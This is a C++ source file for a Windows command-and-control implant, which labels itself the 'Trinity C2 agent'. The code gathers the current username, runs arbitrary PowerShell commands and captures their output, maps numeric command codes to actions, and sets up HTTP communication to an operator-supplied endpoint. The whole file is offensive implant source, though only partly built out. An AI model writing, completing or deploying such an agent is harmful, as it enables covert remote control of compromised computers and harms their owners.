//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
#include "Agent.h"
#include "CommunicationTransportFactory.h"

void Agent::Exit()
{
    // Exit agent process
    ExitProcess(0);
}

/// @brief Retrieves the unique identifier (UID) of the current user.
/// @return
std::string Agent::GetUID()
{
    char username[256];
    DWORD username_len = sizeof(username);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len))
    {
        return std::string(username);
    }

    return std::string();
}

std::string Agent::ExecuteCommand(int commandType)
{
    switch (commandType)
    {
    case 0x0017:
        return GetUID();
    default:
        return std::string();
    }
}

/// @brief Executes a PowerShell command and returns the output as a string.
/// @param command The PowerShell command to execute.
/// @return The output of the PowerShell command.
std::string Agent::ExecutePowerShell(const std::string &command)
{
#ifdef _WIN32
    // Execute PowerShell command and return the output
    std::string result;
    std::string psCommand = "powershell.exe -Command \"" + command + "\"";
    FILE *pipe = _popen(psCommand.c_str(), "r");
    if (!pipe)
    {
        return "Error executing PowerShell command.";
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
    {
        result += buffer;
    }

    _pclose(pipe);
    return result;
#else
    (void)command; // Suppress unused parameter warning
    return "PowerShell execution is only supported on Windows.";
#endif
}

void Agent::Init()
{
    // Initialize agent
    user = GetUID();
}

std::string Agent::GetUser() const
{
    return user;
}

/// @brief Configure the agent's communication settings.
/// @param config The communication configuration to use.
void Agent::ConfigureCommunication(const CommunicationConfig &config)
{
    auto transport = CommunicationTransportFactory::Create(config);
    if (transport == nullptr)
    {
        communicationManager.reset(); // Reset communicationManager if transport creation fails
        return;
    }
    communicationManager = std::make_unique<CommunicationManager>(std::move(transport));
    communicationManager->Configure(config);
}

int main(int argc, char *argv[])
{
    MessageBoxA(NULL, "Trinity C2 agent", ";)", MB_OK);

    Agent agent;
    agent.Init();

    CommunicationConfig config;
    config.type = CommunicationType::HTTP;

    if (argc > 1)
    {
        config.endpoint = argv[1];
    }

    if (argc > 2)
    {
        config.port = static_cast<unsigned short>(std::stoi(argv[2]));
    }

    agent.ConfigureCommunication(config);

    return 0;
}
//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { END OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
